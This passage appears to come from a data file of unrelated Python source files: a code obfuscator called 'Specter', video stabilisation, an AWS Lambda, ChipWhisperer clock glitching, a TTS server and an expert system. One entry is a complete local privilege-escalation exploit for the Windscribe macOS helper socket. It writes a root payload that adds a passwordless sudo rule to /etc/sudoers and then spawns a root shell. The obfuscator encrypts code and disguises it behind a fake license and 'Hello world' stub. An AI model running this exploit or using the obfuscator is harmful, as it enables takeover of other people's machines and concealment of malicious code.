splitting:\r\n                ten_split.append(Specter.hex(Specter.encrypt(script[:splitting], key)))\r\n                script = script[splitting:]\r\n            else:\r\n                ten_split.append(Specter.hex(Specter.encrypt(script, key)))\r\n                break\r\n        lexec = Specter.hex(Specter.encrypt(\"exec\", key))\r\n        lkey = Specter.hex(str(key))\r\n        ten_split.append(lexec)\r\n        ten_split.append(lkey)\r\n        ten_split.append(\"globals\")\r\n        correct = [x for x in ten_split]\r\n        shuffle(ten_split)\r\n        vars = {Specter.randvar(): x for x in ten_split}\r\n        script = \",\".join(vars.keys()) + \"=\" + \",\".join(vars.values()) + \"\\n\"\r\n        all_correct = []\r\n        for x in correct:\r\n            if x not in (lexec, lkey, \"globals\"):\r\n                all_correct.append(Specter.get_key_by_value(vars, x))\r\n        l1, l2, l3 = Specter.randvar(), Specter.randvar(), Specter.randvar()\r\n        glob = f\"{Specter.get_key_by_value(vars, 'globals')}()[{l1}({l2}={Specter.get_key_by_value(vars, lexec)})]\"\r\n        print(stage(\"Creating random vars...\"))\r\n        lambdas = [\r\n            rf\"{l1}=lambda {l2}:''.join(chr(int({l3})-int({lkey}))for {l3} in {l2}.decode().split('\\x00'))\",\r\n            f\"(lambda {l3}:{glob}(''.join({l1}({l2}={l2})for {l2} in {l3}),{Specter.get_key_by_value(vars, 'globals')}()))([{','.join(all_correct)}])\",\r\n        ]\r\n        script = \"from builtins import *\\n\" + script + \"\\n\".join(lambdas)\r\n        return script\r\n\r\n    def layer_2(script: str) -> str:\r\n        print(stage(\"Compiling and dumping code with marshal...\"))\r\n        return dumps(compile(script, \"Specter\", \"exec\"))\r\n\r\n    def layer_3(script: str) -> str:\r\n        split = []\r\n        splitting = 2000\r\n        while True:\r\n            if len(script) >= splitting:\r\n                split.append(script[:splitting])\r\n                script = script[splitting:]\r\n            else:\r\n                split.append(script)\r\n                break\r\n        vars = {Specter.randvar(): x for x in split}\r\n        codevars = \"\\n\".join(\r\n            f\"{a} = Func.calculate({randint(1,9)}){' ' * 500},Func.define('{a}', {b})\"\r\n            for a, b in vars.items()\r\n        )\r\n        print(stage(\"Camouflation of the obfuscated code...\"))\r\n        script = rf\"\"\"\r\n__license__ = \"EPL-2.0\"\r\n__code__ = \"print('Hello world!')\"\r\n\r\n\r\nAny = (...,)\r\n\r\nclass Specter:\r\n    def __init__(self, code: str) -> None:\r\n        self.code = code\r\n        self.execute(...)\r\n        return None\r\n    def execute(self, code: str = ...) -> None:\r\n        return exec(str(code))\r\n    \r\nclass Func:\r\n    def calculate(num: int) -> int:\r\n        return num*2",
    "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\nimport math\nimport time\nimport copy\nimport argparse\nfrom collections import deque\n\nfrom typing import Any, Tuple, List, Deque, Optional\n\nimport cv2\nimport vidstab  # type: ignore\nimport numpy as np\n\n\ndef get_args() -> Any:\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\n        \"--movie\",\n        type=str,\n        default=None,\n    )\n    parser.add_argument(\n        \"--output\",\n        type=str,\n        default='output.mp4',\n    )\n    parser.add_argument(\n        \"--output_frame_width\",\n        type=int,\n        default=1920,\n    )\n    parser.add_argument(\n        \"--smoothing_window\",\n        type=int,\n        default=30,\n    )\n\n    args = parser.parse_args()\n\n    return args\n\n\ndef calc_table_size(length: int) -> Tuple[int, int]:\n    sqrt_number = math.sqrt(length)\n\n    if sqrt_number.is_integer():\n        column_num = int(sqrt_number)\n        row_num = int(sqrt_number)\n    else:\n        column_num = int(sqrt_number) + 1\n\n        fractional_part = sqrt_number - int(sqrt_number)\n        if fractional_part > 0.5:\n            row_num = int(sqrt_number) + 1\n        else:\n            row_num = int(sqrt_number)\n\n    return column_num, row_num\n\n\ndef main(\n    movie_path: str,\n    output_path: str,\n    smoothing_window: int,\n    kp_method_list: List[str],\n    output_frame_width: int,\n) -> None:\n    # \u5404\u624b\u6cd5\u5411\u3051\u306e\u30c7\u30fc\u30bf\u4fdd\u6301\u7528\u306e\u30ad\u30e5\u30fc\u3092\u751f\u6210\n    stabilizer_list: List[Any] = []\n    stabilized_frame_list: List[np.ndarray] = []\n    elapsed_time_list: List[float] = []\n    for kp_method in kp_method_list:\n        stabilizer_list.append(vidstab.VidStab(kp_method=kp_method))\n        elapsed_time_list.append(0)\n        stabilized_frame_list.append(np.array([]))\n\n    # \u52d5\u753b\u30d5\u30a1\u30a4\u30eb\u3092\u6e96\u5099\n    video_capture = cv2.VideoCapture(movie_path)\n    video_writer = None\n\n    frame_count: int = 0\n    frame_queue: Deque[Any] = deque(maxlen=smoothing_window)\n    while True:\n        # \u30d5\u30ec\u30fc\u30e0\u8aad\u307f\u8fbc\u307f\n        ret, frame = video_capture.read()\n        if not ret:\n            break\n\n        frame_count += 1\n\n        # \u30d6\u30ec\u88dc\u6b63\u3092\u5b9f\u65bd\n        for index, stabilizer in enumerate(stabilizer_list):\n            start_time = time.time()\n            stabilized_frame = stabilizer.stabilize_frame(\n                input_frame=frame,\n                smoothing_window=smoothing_window,\n            )\n            elapsed_time = time.time() - start_time\n\n            stabilized_frame_list[index] = stabilized_frame\n            elapsed_time_list[index] = elapsed_time\n\n        frame_queue.append(frame)\n        if frame_count <= smoothing_window:\n            continue\n\n        # \u63cf\u753b\n        debug_image = draw_debug_info(\n            frame_queue[0],\n            kp_method_list,\n            stabilized_frame_list,\n            elapsed_time_list,\n            smoothing_window,\n            output_frame_width,\n        )\n\n        # \u52d5\u753b\u66f8\u304d\u8fbc\u307f\n        if video_writer is None and debug_image is not None:\n            # VideoWriter\u751f\u6210\n            debug_width = debug_image.shape[1]\n            debug_height = debug_image.shape[0]\n            video_writer = cv2.VideoWriter(\n                output_path,\n                cv2.VideoWriter_fourcc(*\"mp4v\"),  # type: ignore\n                video_capture.get(cv2.CAP_PROP_FPS),\n                (debug_width, debug_height),\n            )\n        if video_writer is not None:\n            video_writer.write(debug_image)\n\n        # \u30c7\u30d0\u30c3\u30b0\u8868\u793a\n        cv2.imshow('VidStab', debug_image)\n        key = cv2.waitKey(1)\n        if key == 27:  # ESC\n            break\n\n    video_capture.release()\n    if video_writer is not None:\n        video_writer.release()\n    cv2.destroyAllWindows()\n\n\ndef draw_debug_info(\n    frame: np.ndarray,\n    kp_method_list: List[str],\n    stabilized_frame_list: List[np.ndarray],\n    elapsed_time_list: List[float],\n    smoothing_window: int,\n    output_frame_width: int,\n):\n    debug_image: Optional[np.ndarray] = None\n\n    column_num, row_num = calc_table_size(len(kp_method_list) + 1)\n    resize_width = int(output_frame_width / column_num)\n    image_width, image_height = frame.shape[1], frame.shape[0]\n    resize_height = int(image_height * (resize_width / image_width))\n\n    row_image: Any = None\n    for row_index in range(row_num):\n        column_image: Any = None\n        for column_index in range(column_num):\n            index = (column_index + (row_index * column_num))\n            if index <= len(kp_method_list):\n                if column_image is None:\n                    if index == 0:\n                        column_image = draw_analysis_info(\n                            frame,\n                            resize_width,\n                            resize_height,\n                            'Original',\n                            None,\n                            None,\n                        )\n                    else:\n                        column_image = draw_analysis_info(\n                            stabilized_frame_list[index - 1],\n                            resize_width,\n                            re",
    "#!/usr/bin/python3\n\nimport sys \nimport os\nimport socket\nimport time\nimport struct\nimport shutil\nimport signal\nimport io\n\n\nWINDSCRIBE_PATH = \"/Applications/Windscribe.app/Contents/MacOS/Windscribe\"\nPAYLOAD_FILE = \"/tmp/test.sh\"\nTOTAL_TRIES = 100\n\n# play around with these if the race doesn't work,\n# instructions are in the readme\nCHILD_POST_SEND_WAIT_TIME = 0.01\nPARENT_KILL_WAIT_TIME = 0.1\n\n# this will run as root\n#script_payload = \"#!/bin/bash\\nid > /tmp/pwned\\n\"\nscript_payload = \"#!/bin/bash\\nid > /tmp/pwned\\necho -en \\\"\\nALL ALL=(ALL) NOPASSWD:ALL\\n\\\" >> /etc/sudoers\\n\"\n\n\n# NOTE: generate with boosttest.cpp, will execute /tmp/test.sh\nopenvpn_start_data = [\n\t0x30, 0x20, 0x30, 0x20, 0x34, 0x36, 0x20, 0x2f, 0x41, 0x70, 0x70, 0x6c,\n\t0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2f, 0x57, 0x69, 0x6e,\n\t0x64, 0x73, 0x63, 0x72, 0x69, 0x62, 0x65, 0x2e, 0x61, 0x70, 0x70, 0x2f,\n\t0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x73, 0x2f, 0x48, 0x65, 0x6c,\n\t0x70, 0x65, 0x72, 0x73, 0x2f, 0x20, 0x31, 0x37, 0x20, 0x77, 0x69, 0x6e,\n\t0x64, 0x73, 0x63, 0x72, 0x69, 0x62, 0x65, 0x6f, 0x70, 0x65, 0x6e, 0x76,\n\t0x70, 0x6e, 0x20, 0x34, 0x20, 0x43, 0x43, 0x43, 0x43, 0x20, 0x31, 0x34,\n\t0x20, 0x60, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x74, 0x65, 0x73, 0x74, 0x2e,\n\t0x73, 0x68, 0x60, 0x20, 0x30, 0x20, 0x30\n]\n\n\ndef do_socket_send(client):\n\t# for testing, cmdid 0 is invalid\n\t#cmdid = 0\n\t#payload = b''\n\t\n\t# openvpn start\n\tcmdid = 1\n\tpayload = bytearray(openvpn_start_data)\n\tpid = 0\n\tlength = len(payload)\n\n\theader = bytearray()\n\theader += struct.pack(\"<i\", cmdid)\n\theader += struct.pack(\"<I\", pid)\n\theader += struct.pack(\"<I\", length)\n\n\tpacket = header + payload\n\n\t# print(\"DBG\", packet.hex())\n\n\t# print(\"[+] Sending data\")\n\tclient.connect(\"/private/var/run/windscribe_helper_socket2\")\n\tclient.sendall(packet)\n\n\n\ndef main():\n\tprint(\"[+] Preparing\")\n\tif os.path.exists(PAYLOAD_FILE):\n\t\tos.unlink(PAYLOAD_FILE)\n\tf = open(PAYLOAD_FILE, \"w\")\n\tf.write(script_payload)\n\tos.fchmod(f.fileno(), 0o0755)\n\tf.close()\n\n\tprint(\"[+] Opening windscribe log file\")\n\tlogfile = open(\"/Library/Logs/com.windscribe.helper.macos/helper_log.txt\")\n\tlogfile.seek(0, io.SEEK_END)\n\tlogbuf = \"\"\n\n\tprint(\"[+] Launching exploit\")\n\tsuccess = False\n\tfor i in range(TOTAL_TRIES):\n\t\tprint(\"[+] Try {}/{}\". format(i, TOTAL_TRIES))\n\t\tpid = os.fork()\n\t\tif pid == 0:\n\t\t\t# open the socket here so it survives until execve()\n\t\t\t# print(\"[+] Connecting\")\n\t\t\tclient = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n\n\t\t\t# print(\"[+] Child sending data\")\n\t\t\tdo_socket_send(client)\n\n\t\t\t# don't be TOO fast\n\t\t\ttime.sleep(CHILD_POST_SEND_WAIT_TIME)\n\n\t\t\t# print(\"[+] Child calling execve\")\n\t\t\targs = [WINDSCRIBE_PATH]\n\t\t\tos.execve(args[0], args, env={})\n\n\t\t\tprint(\"[-] Child's execve() failed\")\n\t\t\texit(0)\n\n\t\ttime.sleep(PARENT_KILL_WAIT_TIME)\n\t\tos.kill(pid, signal.SIGKILL)\n\t\tos.waitpid(pid, 0)\n\n\t\tlines = logfile.readlines()\n\t\tfor i in lines:\n\t\t\tprint(\"[?] LOGLINE\", i.strip())\n\n\t\t# don't rely on logfile\n\t\tif os.path.exists(\"/tmp/pwned\"):\n\t\t\tprint(\"[+] PWNED :)\")\n\t\t\tsuccess = True\n\t\t\tbreak\n\n\tif not success:\n\t\tprint(\"[-] Failed to exploit\")\n\t\treturn 0\n\t\n\tprint(\"[+] Spawning shell\")\n\targs = [\"/usr/bin/sudo\", \"/bin/bash\"]\n\tos.execve(args[0], args, env={})\n\n\tprint(\"[-] Shell spawning failed\")\n\n\nif __name__ == \"__main__\":\n\tmain()\n\n",
    "# Version: 2024.03.20\n\"\"\"\n**********************************************************************************************************************\n *  Copyright 2020 Amazon.com, Inc. or its affiliates. All Rights Reserved                                            *\n *                                                                                                                    *\n *  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated      *\n *  documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation   *\n *  the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and  *\n *  to permit persons to whom the Software is furnished to do so.                                                     *\n *                                                                                                                    *\n *  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO  *\n *  THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE    *\n *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF         *\n *  CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS *\n *  IN THE SOFTWARE.                                                                                                  *\n **********************************************************************************************************************\n\"\"\"\n\n# Import the necessary modules for this function\nimport json\nimport os\nimport logging\nimport boto3\nimport phonenumbers\n\n# Import the VMX Model Type\nimport sub_connect_task\n\n# Establish logging configuration\nlogger = logging.getLogger()\nlogger.setLevel(logging.getLevelName(os.getenv('lambda_logging_level', 'DEBUG')))\nconnect_client = boto3.client('connect')\n\ndef lambda_handler(event, context):\n    logger.debug(event)\n\n    # Process the record\n    # Establish writer data\n    writer_payload = {}\n\n    # Establish data for transcript and recording\n    try:\n        transcript_key = event['detail']['object']['key']\n        transcript_job = transcript_key.replace('.json','')\n        contact_id = transcript_job.split('_',1)[0]\n        recording_key = contact_id + '.wav'\n        transcript_bucket = os.environ['s3_transcripts_bucket']\n        recording_bucket = os.environ['s3_recordings_bucket']\n\n    except Exception as e:\n        logger.error(e)\n        logger.error('Record Result: Failed to extract keys')\n        return {'result':'Failed to extract keys'}\n\n    # Invoke presigner Lambda to generate presigned URL for recording\n    try:\n        client = boto3.client('lambda')\n\n        input_params = {\n            'recording_bucket': recording_bucket,\n            'recording_key': recording_key\n        }\n\n        lambda_response = client.invoke(\n            FunctionName = os.environ['presigner_function_arn'],\n            InvocationType = 'RequestResponse',\n            Payload = json.dumps(input_params)\n        )\n        response_from_presigner = json.load(lambda_response['Payload'])\n        raw_url = response_from_presigner['presigned_url']\n\n    except Exception as e:\n        logger.error(e)\n        logger.error('Record Result: Failed to generate presigned URL')\n        return {'result':'Failed to generate presigned URL'}\n\n    # Extract the tags from the recording object\n    try:\n        s3_client = boto3.client('s3')\n        object_data = s3_client.get_object_tagging(\n            Bucket = recording_bucket,\n            Key = recording_key\n        )\n\n        object_tags = object_data['TagSet']\n        loaded_tags = {}\n\n        for i in object_tags:\n            loaded_tags.update({i['Key']:i['Value']})\n\n    except Exception as e:\n        logger.error(e)\n        logger.error('Record Result: Failed to extract tags')\n        return {'result':'Failed to extract tags'}\n\n    # Grab the transcript from S3\n    try:\n        s3_resource = boto3.resource('s3')\n\n        transcript_object = s3_resource.Object(transcript_bucket, transcript_key)\n        file_content = transcript_object.get()['Body'].read().decode('utf-8')\n        json_content = json.loads(file_content)\n\n        transcript_contents = json_content['results']['transcripts'][0]['transcript']\n\n    except Exception as e:\n        logger.error(e)\n        logger.error('Record Result: Failed to retrieve transcript')\n        return {'result':'Failed to retrieve transcript'}\n\n    # Set some key vars\n    queue_arn = loaded_tags['vmx3_queue_arn']\n    arn_substring = queue_arn.split('instance/')[1]\n    instance_id = arn_substring.split('/queue')[0]\n    queue_id = arn_substring.split('queue/')[1]\n    writer_payload.update({'instance_id':instance_id,'contact_id':contact_id,'queue_id':queue_id})\n\n    # Determine",
    "#!/usr/bin/env python\n# coding: utf-8\n\n\"\"\"\nThis script performs clock glitching attacks using ChipWhisperer against an FPGA target.\n\nRequirements:\n- ChipWhisperer library\n- glitch library\n- subprocess\n- csv\n- ast\n- time\n- importlib\n- tqdm\n- re\n- struct\n- progressbar\n- argparse\n\"\"\"\n\n#### LIBRARY ####\n\nimport chipwhisperer as cw\nimport src.glitch as glitch\nimport subprocess\nimport csv\nimport ast\nimport time\nfrom importlib import reload\nfrom tqdm.notebook import tqdm\nimport re\nimport struct\nfrom progressbar import progressbar\nimport progressbar\nimport argparse, configparser, textwrap\nimport configparser\nimport serial\nimport os\nfrom prettytable import PrettyTable\n\nimport src.cw_toolkit as tk\n\n    \n# Widget for display progress bar\nwidgets = [\n        progressbar.Percentage(),\n        ' [', progressbar.Timer(), '] ',\n        progressbar.GranularBar(), ' ',\n    ]\n\n\n# Configuration scope\nPLATFORM =\"NOTHING\"\nSCOPETYPE = 'OPENADC'\nSS_VER = 'SS_VER_1_0'\n\n# Arguments manager\nparser = argparse.ArgumentParser(description = textwrap.dedent('''\nArguments description for glitch clock with the chipWhisperer against FPGA target\n\n * All is faulty, it needs to be configured :\n   - name of board FPGA used\n   - ID Product of Chipwhisperer used\n   - ID Product of FPGA board used\n   - bitstream-file\n * Only one part is faulty, it needs to be configured :\n   - min-width, max-width & min-offset, max-offset & min-ext-offset, max-ext-offset\n   - repeat parameters can be modified\n   - function-targeted (if other than NAPOT)\n   - specify the folder with README and log file of the experiment\n   - specify the log file in csv\n   - And a parameter allows to resume the experiment, where it crash, if neccessary about the number of FI.\n'''), formatter_class=argparse.RawTextHelpFormatter)\n\nparser.add_argument('--name-board',         type=str,                     help = 'Name of FPGA used', required = True)\nparser.add_argument('--sn-chipwhisperer',   type=str,                     help = 'ID Product of Chipwhisperer used', required = True)\nparser.add_argument('--ftdi-FPGA',          type=str,                     help = 'ID Product of FPGA targeted', required = True)\nparser.add_argument('--freq-load-bit',      type=int,                     help = 'Frequency speed for load the bitstream with OpenFPGALoader')\nparser.add_argument('--bitstream-file',     type=str,                     help = 'Bitstream file target`s build path', required = True)\nparser.add_argument('--min-width',          type=int,   default = -49,    help = 'Value minimum Width')\nparser.add_argument('--max-width',          type=int,   default = 49,     help = 'Value maximum Width')\nparser.add_argument('--min-offset',         type=int,   default = -49,    help = 'Value minimum offset')\nparser.add_argument('--max-offset',         type=int,   default = 49,     help = 'Value maximum offset')\nparser.add_argument('--min-ext-offset',     type=int,   default = 0,      help = 'Value minimum ext_offset')\nparser.add_argument('--max-ext-offset',     type=int,   default = 200,    help = 'Value maximum ext_offset')\nparser.add_argument('--repeat',             type=int,   default = 5,      help = 'Value repeat')\nparser.add_argument('--resume-progress',    type=int,   default = 0,      help = 'Value to resume progression')\nparser.add_argument('--size-data',          type=int,   default = 0,      help = 'Size of character to read by injection')\nparser.add_argument('--function-targeted',  type=str,   default='s',      help = 'Specify the letter for selected the function target:\\n')\nparser.add_argument('--function-argument',  type=str,   default='',       help = 'If necessary specify argument for function target\\n')\nparser.add_argument('--path-exp',                default = None,          help = 'Folder experimentation')\nparser.add_argument('--csv-log',                default = None,           help = 'Log file')\nargs = parser.parse_args()\n\n\nif args.path_exp is not None and not os.path.exists(args.path_exp):\n    os.makedirs(args.path_exp)\n\nif args.path_exp is not None:\n    file_md = \"README.md\"\n    README                  = os.path.join(args.path_exp, file_md)\n\n    print(\"\\nClock glitching attacks using ChipWhisperer against an FPGA target \ud83c\udfaf \\n\")\n\n    # Display configuration \n    print(\"Configuration setup \ud83d\udd27 : \")\n    print(f\"Bitstream File: {args.bitstream_file}\")\n    print(f\"Function Targeted: {args.function_targeted}\")\n    print(\"\\nGlitch Parameters \ud83c\udfaf:\")\n    table_conf = PrettyTable()\n    table_conf.field_names = [\"Parameters\", \"Minimum\", \"Maximum\"]\n    table_conf.add_row([\"width\", args.min_width, args.max_width])\n    table_conf.add_row([\"offset\", args.min_offset, args.max_offset])\n    table_conf.add_row([\"ext_offset\", args.min_ext_offset, args.max_ext_offset])\n    print(table_conf)\n    print(f\"Repeat: {args.repeat}\")\n\n    print(\"\\nLog file \ud83d\udcc1: \")\n    print(args.csv_log)\n\n    with open(README, 'a') as file:\n        file.write(\"Configuration setup \ud83d\udd27 : \\n\")\n        file.write(f\"Bitstream File: {args.bitstr",
    "import argparse\nimport os,io,wave\nimport sys\nimport re_matching\n\nnow_dir = os.getcwd()\n\nfrom scipy.io.wavfile import write\n\n\ndef audio_array_to_bytes(sample_rate, audio_data):\n    # \u5c06\u97f3\u9891\u6570\u636e\u8f6c\u6362\u4e3a bytes\n    audio_data = np.array(audio_data, dtype=np.int16)\n    \n    # \u521b\u5efa\u4e00\u4e2a BytesIO \u5bf9\u8c61\n    byte_io = io.BytesIO()\n    \n    # \u5c06\u97f3\u9891\u6570\u636e\u5199\u5165 BytesIO \u5bf9\u8c61\n    write(byte_io, sample_rate, audio_data)\n    \n    # \u4ece BytesIO \u5bf9\u8c61\u4e2d\u8bfb\u53d6\u4e8c\u8fdb\u5236\u6570\u636e\n    result_bytes = byte_io.getvalue()\n    \n    return result_bytes\n\n\nfrom starlette.middleware.cors import CORSMiddleware  #\u5f15\u5165 CORS\u4e2d\u95f4\u4ef6\u6a21\u5757\n\n#\u8bbe\u7f6e\u5141\u8bb8\u8bbf\u95ee\u7684\u57df\u540d\norigins = [\"*\"]  #\"*\"\uff0c\u5373\u4e3a\u6240\u6709\u3002\n\nimport signal\nfrom time import time as ttime\nimport torch\nimport librosa\nimport soundfile as sf\nfrom fastapi import FastAPI, Request, HTTPException\nfrom fastapi.responses import StreamingResponse, JSONResponse\nimport uvicorn\n\nimport numpy as np\n\nfrom io import BytesIO\n\nimport utils\nfrom infer import infer_stream, latest_version, get_net_g, infer_multilang\n\nfrom config import config\nfrom tools.translate import translate\nimport gradio as gr\n\nnet_g = None\n\ndevice = config.webui_config.device\nif device == \"mps\":\n    os.environ[\"PYTORCH_ENABLE_MPS_FALLBACK\"] = \"1\"\n\n\nhps = utils.get_hparams_from_file(config.webui_config.config_path)\n# \u82e5config.json\u4e2d\u672a\u6307\u5b9a\u7248\u672c\u5219\u9ed8\u8ba4\u4e3a\u6700\u65b0\u7248\u672c\nversion = hps.version if hasattr(hps, \"version\") else latest_version\nnet_g = get_net_g(\n    model_path=config.webui_config.model, version=version, device=device, hps=hps\n)\nspeaker_ids = hps.data.spk2id\nspeakers = list(speaker_ids.keys())\n\n# from https://huggingface.co/spaces/coqui/voice-chat-with-mistral/blob/main/app.py\ndef wave_header_chunk(frame_input=b\"\", channels=1, sample_width=2, sample_rate=44100):\n    # This will create a wave header then append the frame input\n    # It should be first on a streaming wav file\n    # Other frames better should not have it (else you will hear some artifacts each chunk start)\n    wav_buf = io.BytesIO()\n    with wave.open(wav_buf, \"wb\") as vfout:\n        vfout.setnchannels(channels)\n        vfout.setsampwidth(sample_width)\n        vfout.setframerate(sample_rate)\n        vfout.writeframes(frame_input)\n\n    wav_buf.seek(0)\n    return wav_buf.read()\n\ndef generate_audio(\n    slices,\n    sdp_ratio,\n    noise_scale,\n    noise_scale_w,\n    length_scale,\n    speaker,\n    language,\n    reference_audio,\n    emotion,\n    style_text,\n    style_weight,\n    skip_start=False,\n    skip_end=False,\n):\n    audio_list = []\n    # silence = np.zeros(hps.data.sampling_rate // 2, dtype=np.int16)\n    with torch.no_grad():\n        for idx, piece in enumerate(slices):\n            skip_start = (idx != 0) and skip_start\n            skip_end = (idx != len(slices) - 1) and skip_end\n            audio = infer(\n                piece,\n                reference_audio=reference_audio,\n                emotion=emotion,\n                sdp_ratio=sdp_ratio,\n                noise_scale=noise_scale,\n                noise_scale_w=noise_scale_w,\n                length_scale=length_scale,\n                sid=speaker,\n                language=language,\n                hps=hps,\n                net_g=net_g,\n                device=device,\n                style_text=style_text,\n                style_weight=style_weight,\n                skip_start=skip_start,\n                skip_end=skip_end,\n            )\n            audio16bit = gr.processing_utils.convert_to_16_bit_wav(audio)\n            audio_list.append(audio16bit)\n            # audio_list.append(silence)  # \u5c06\u9759\u97f3\u6dfb\u52a0\u5230\u5217\u8868\u4e2d\n    return audio_list\n\n\ndef generate_audio_multilang(\n    slices,\n    sdp_ratio,\n    noise_scale,\n    noise_scale_w,\n    length_scale,\n    speaker,\n    language,\n    reference_audio,\n    emotion,\n    style_text,\n    style_weight,\n    skip_start=False,\n    skip_end=False,\n):\n    audio_list = []\n    # silence = np.zeros(hps.data.sampling_rate // 2, dtype=np.int16)\n    with torch.no_grad():\n        for idx, piece in enumerate(slices):\n            skip_start = (idx != 0) and skip_start\n            skip_end = (idx != len(slices) - 1) and skip_end\n            audio = infer_multilang(\n                piece,\n                reference_audio=reference_audio,\n                emotion=emotion,\n                sdp_ratio=sdp_ratio,\n                noise_scale=noise_scale,\n                noise_scale_w=noise_scale_w,\n                length_scale=length_scale,\n                sid=speaker,\n                language=language[idx],\n                hps=hps,\n                net_g=net_g,\n                device=device,\n                style_text=style_text,\n                style_weight=style_weight,\n                skip_start=skip_start,\n                skip_end=skip_end,\n            )\n            audio16bit = gr.processing_utils.convert_to_16_bit_wav(audio)\n            audio_list.append(audio16bit)\n            # audio_list.append(silence)  # \u5c06\u9759\u97f3\u6dfb\u52a0\u5230\u5217\u8868\u4e2d\n    return audio_list\n\n\ndef tts_split_stream(\n    text: str,\n    speaker,\n    sdp_ratio,\n    noise_scale,\n    noise_scale_w,\n    length_scale,\n    language,\n    cut_by_sent,\n    interval_between_par",
    "from aima3.logic import FolKB, expr, fol_bc_ask\nfrom routers import schema\n\nrules = {\n    # Existing rules\n    \"rule1\": 'Symptom(x, \"A lot of crashing\") & Symptom(x, \"Suddenly shut down\") & Symptom(x, \"Coil Whine\") ==> Problem(x, \"CPU Problem\")',\n    \"rule2\": 'Symptom(x, \"Blue screen\") & Symptom(x, \"Poor performance\") & Symptom(x, \"A lot of crashing\") ==> Problem(x, \"RAM Problem\")',\n    \"rule3\": 'Symptom(x, \"Poor performance in games\") & Symptom(x, \"Visual artifacts\") & Symptom(x, \"System freezes\") ==> Problem(x, \"GPU Problem\")',\n    \"rule4\": 'Symptom(x, \"Unexpected shutdowns\") & Symptom(x, \"Difficulty starting\") & Symptom(x, \"Burning plastic smell\") ==> Problem(x, \"Power Supply Problem\")',\n    \"rule5\": '(Symptom(x, \"No post\") & Symptom(x, \"Boots to different error messages\") & Symptom(x, \"No power to USB devices\")) ==> Problem(x, \"Motherboard Problem\")',\n    \"rule6\": 'Symptom(x, \"Slow boot time\") & Symptom(x, \"Frequent freezing\") & Symptom(x, \"Blue screen\") ==> Problem(x, \"Hard Drive Problem\")',\n    \"rule7\": 'Symptom(x, \"No internet connection\") & Symptom(x, \"Slow internet speed\") & Symptom(x, \"Frequent disconnection\") ==> Problem(x, \"Network Card Problem\")',\n    \"rule8\": 'Symptom(x, \"No sound\") & Symptom(x, \"Distorted sound\") & Symptom(x, \"Frequent audio cut-out\") ==> Problem(x, \"Sound Card Problem\")',\n    \"rule9\": 'Symptom(x, \"Blurry image\") & Symptom(x, \"No video output\") & Symptom(x, \"Distorted image\") ==> Problem(x, \"Video Card Problem\")',\n    \"rule10\": 'Symptom(x, \"PC not booting\") & Symptom(x, \"Incorrect date and time\") & Symptom(x, \"Hardware not recognized\") ==> Problem(x, \"BIOS Issue\")',\n    \"rule11\": 'Symptom(x, \"Slow performance\") & Symptom(x, \"Frequent crashes\") & Symptom(x, \"Software compatibility issues\") ==> Problem(x, \"Operating System Problem\")',\n    \"rule12\": 'Symptom(x, \"No power\") & Symptom(x, \"Burning smell\") & Symptom(x, \"Visible damage on power cord\") ==> Problem(x, \"Power Cord Problem\")',\n    \"rule13\": 'Symptom(x, \"Keys not working\") & Symptom(x, \"Sticky keys\") & Symptom(x, \"Keys typing wrong characters\") ==> Problem(x, \"Keyboard Problem\")',\n    \"rule14\": 'Symptom(x, \"Mouse not moving\") & Symptom(x, \"Clicks not registering\") & Symptom(x, \"Mouse pointer jittering\") ==> Problem(x, \"Mouse Problem\")',\n    \"rule15\": 'Symptom(x, \"No display\") & Symptom(x, \"Flickering screen\") & Symptom(x, \"Distorted image\") ==> Problem(x, \"Monitor Problem\")',\n}\n\n\nclass Agenda:\n    def __init__(self):\n        self.agenda = []\n\n    def add_task(self, task):\n        self.agenda.append(task)\n\n    def get_task(self):\n        return self.agenda.pop()\n\n    def is_empty(self):\n        return len(self.agenda) == 0\n\n\nclass WorkingMemory:\n    def __init__(self):\n        self.memory = {}  # Change memory to a dictionary\n\n    def add_fact(self, fact, exists):\n        self.memory[fact] = exists  # Add a fact and its existence status to the memory\n\n    def get_fact(self, fact):\n        return self.memory.get(fact, None)  # Get the existence status of a fact\n\n    def is_empty(self):\n        return len(self.memory) == 0  # Check if the memory is empty\n\n    def contains_fact(self, fact):\n        return fact in self.memory  # Check if a specific fact is in the memory\n\n\nagenda = Agenda()\n\n\ndef diagnose(symptoms: schema.UserSymptoms):\n\n    kb = FolKB()\n    working_memory = WorkingMemory()\n\n    for rule in rules.values():\n        kb.tell(expr(rule))\n\n    for symptom in [symptoms.symptom1, symptoms.symptom2, symptoms.symptom3]:\n        exists = bool(fol_bc_ask(kb, expr(f'Symptom(x, \"{symptom}\")')))\n        kb.tell(expr(f'Symptom(x, \"{symptom}\")'))\n        working_memory.add_fact(symptom, exists)\n\n    problems = [\n        \"CPU Problem\",\n        \"RAM Problem\",\n        \"GPU Problem\",\n        \"Power Supply Problem\",\n        \"Motherboard Problem\",\n        \"Hard Drive Problem\",\n        \"Network Card Problem\",\n        \"Sound Card Problem\",\n        \"Video Card Problem\",\n        \"BIOS Issue\",\n        \"Operating System Problem\",\n        \"Power Cord Problem\",\n        \"Keyboard Problem\",\n        \"Mouse Problem\",\n        \"Monitor Problem\",\n    ]\n    for problem in problems:\n        agenda.add_task(problem)\n\n    diagnosis = None\n\n    while not agenda.is_empty():\n        problem = agenda.get_task()\n        solutions = fol_bc_ask(kb, expr(f'Problem(x, \"{problem}\")'))\n        first_solution = next(solutions, None)\n        if first_solution is not None:\n            diagnosis = problem\n            break\n\n    